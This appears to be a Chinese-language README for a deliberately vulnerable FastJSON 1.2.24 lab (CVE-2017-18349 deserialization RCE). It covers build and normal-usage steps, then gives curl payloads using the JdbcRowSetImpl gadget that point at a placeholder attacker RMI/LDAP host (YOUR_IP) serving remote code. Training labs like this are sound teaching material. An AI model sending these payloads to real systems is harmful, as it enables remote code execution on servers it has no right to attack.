# FastJSON 1.2.24 漏洞靶场

## 环境信息
- FastJSON: 1.2.24（漏洞版本）
- JDK: 1.8
- 漏洞类型: 反序列化 RCE（CVE-2017-18349）

## 靶场接口

| 方法 | 路径 | 说明 |
|------|------|------|
| GET | / | 首页 |
| POST | /api/user/info | 用户信息查询（漏洞点） |

## 构建 & 运行

```bash
cd /root/test/fastjson-lab
mvn clean package -q
java -jar target/fastjson-lab-1.0.jar
```

## 正常用法

```bash
# 用户信息查询
curl -X POST http://localhost:8888/api/user/info \
  -H 'Content-Type: application/json' \
  -d '{"@type":"com.vulnlab.User","name":"张三","age":18}'
```

## 漏洞利用

### 方法一：TemplatesImpl 链（不出网）

需要构造恶意字节码并 base64 编码，通过 @type 指定 TemplatesImpl 触发。

### 方法二：JdbcRowSetImpl 链（需要出网）

```bash
# 需要先启动恶意 RMI/LDAP 服务
# 然后发送 payload
curl -X POST http://localhost:8888/api/user/info \
  -H 'Content-Type: application/json' \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://YOUR_IP:1099/Exploit","autoCommit":true}'
```

## 本地测试 RCE

```bash
# Linux - 执行命令
curl -X POST http://localhost:8888/api/user/info \
  -H 'Content-Type: application/json' \
  -d '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://YOUR_IP:1389/Exploit","autoCommit":true}'
```

## 漏洞原理

1. FastJSON 1.2.24 默认开启 autoType
2. @type 可以指定任意类
3. FastJSON 会自动创建实例并调用 setter
4. 通过 TemplatesImpl 或 JdbcRowSetImpl 等 gadget 触发 RCE
